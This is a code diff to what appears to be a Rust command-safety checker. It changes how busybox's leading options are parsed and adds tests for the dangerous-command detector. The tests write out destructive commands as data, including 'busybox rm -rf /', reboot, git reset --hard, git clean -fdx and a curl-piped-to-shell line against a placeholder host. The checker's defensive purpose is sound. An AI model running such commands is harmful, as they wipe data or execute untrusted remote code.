@@ -779,8 +779,11 @@ fn select_execution_wrappers_mode(
         match name {
             "busybox" if strip_busybox => {
                 tokens = &tokens[1..];
-                while tokens.first().is_some_and(|token| token.starts_with('-')) {
-                    tokens = &tokens[1..];
+                if tokens.first().is_some_and(|applet| applet.starts_with('-')) {
+                    // BusyBox has no global `--` applet separator. A leading
+                    // dash selects a BusyBox action or an invalid applet, so
+                    // none of the remaining argv can become a child command.
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             "nohup" => {
@@ -2922,6 +2925,38 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "nohup option or direct argv was reparsed as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn busybox_requires_an_applet_at_the_dispatch_boundary() {
+        for command in [
+            "busybox rm -rf /",
+            "busybox reboot",
+            "busybox chroot /srv/root rm -rf /",
+            "env busybox rm -rf /",
+            "printf x | xargs busybox rm -rf /",
+            "curl https://example.invalid/x | busybox sh",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "busybox -- rm -rf /",
+            "busybox --help rm -rf /",
+            "busybox --list git reset --hard HEAD~1",
+            "busybox --list-full systemctl reboot",
+            "busybox --install /tmp/applets rm -rf /",
+            "busybox --install -s /tmp/applets git clean -fdx",
+            "busybox --unknown systemctl reboot",
+            "busybox -h rm -rf /",
+            "busybox - rm -rf /",
+            "busybox command rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "busybox's own action or invalid applet was treated as a child for {command:?}"
             );
         }
     }
